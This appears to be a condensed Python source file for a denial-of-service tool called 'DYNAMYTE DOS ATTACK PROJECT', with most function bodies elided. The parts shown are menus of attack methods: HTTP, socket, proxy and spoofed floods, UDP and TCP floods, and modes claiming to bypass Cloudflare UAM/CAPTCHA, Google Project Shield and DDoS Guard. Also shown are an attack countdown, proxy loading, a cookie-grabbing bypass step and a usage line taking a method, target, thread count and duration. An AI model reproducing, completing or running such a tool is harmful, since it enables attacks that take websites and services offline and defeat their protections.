...
def countdown(t):
    ...
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            print("\r "" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            print("\r "" Attack Done !\n")
            return
...
def get_proxies():
    ...
    if not os.path.exists("./proxy.txt"):
        print(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
        return False
...
def help():
    clear()
    print("HELP PANEL\n")
    print("layer7:Show Layer7 Methods\n")
    print("layer4:Show Layer4 Methods\n")
    print("tools:Show tools\n")
    print("credit:Show credit\n")
    print("exit:Exit DYNAMYTE DDoS\n")
    print("\n")
##############################################################################################
def credit():
    print("Developer:QADIR TERNIKAR \n")
    print("UI Design :\n")
    print("Methods/Tools:\n")
    print("\n")    
##############################################################################################
def layer7():
    clear()
    print("Layer 7\n")
    print("cfb      Bypass CF Attack\n")
    print("pxcfb    Bypass CF Attack With Proxy\n")                  
    print("cfreq    Bypass CF UAM, CAPTCHA, BFM (request)\n")
    print("cfsoc    Bypass CF UAM, CAPTCHA, BFM (socket)\n")
    print("pxsky    Bypass Google Project Shield, Vshield,\n")
    print(" DDoS Guard Free, CF NoSec With Proxy\n")
    print("sky      Sky method without proxy\n")
    print("http2    HTTP 2.0 Request Attack\n")
    print("pxhttp2HTTP 2.0 Request Attack With Proxy\n")
    print("get     Get Request Attack\n")
    print("post    Post Request Attack\n")
    print("head    Head Request Attack\n")
    print("pps     Only GET / HTTP/1.1\n")
    
    print("spoof   HTTP Spoof Socket Attack\n")
    print("pxspoof HTTP Spoof Socket Attack With Proxy\n")
    
    print("soc     Socket Attack\n")
    print("pxraw   Proxy Request Attack\n")
    print("pxsoc   Proxy Socket Attack\n") 
    print("\n")
##############################################################################################
def layer4():
    clear()
    print(" Layer 4")
    print("udp   UDP Attack\n")
    print("tcp   TCP Attack\n")
    print("\n")
##############################################################################################
def tools():
    clear()
    ...
    print(" geoip Geo IP Address Lookup\n")
    print(" dns   Classic DNS Lookup\n")
    print("subnet Subnet IP Address Lookup \n")
    print("\n")
##############################################################################################
def title():
    print("DYNAMYTE DOS ATTACK PROJECT\n")
    print("Welcome To The Main Screen Of DYNAMYTE DOS ATTACK\n")
...
def command():
    ...
    if command == "cls" or command == "clear":
        ...
        target, thread, t = get_info_l7()
        print(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            ...
            print(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
...
def func():
    ...
    print("cfb        ""Bypass CF attack\n")
    print("pxcfb      ""Bypass CF attack with proxy\n")
    print("cfpro      ""Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
    print("cfsoc      ""Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
#    print("sky        ""HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield\n")
#    print("stellar    ""HTTPS Sky method without proxies\n")
    print("raw        ""Request attack\n")
    print("post       ""Post Request attack\n")
    print("head       ""Head Request attack\n")
    print("soc        ""Socket attack\n")
    print("pxraw      ""Proxy Request attack\n")
...
if __name__ == '__main__':
    ...
    if len(sys.argv) < 2:
        ...
        print("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
        print(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        sys.exit()
    ua = open('./resources/ua.txt', 'r').read().split('\n')
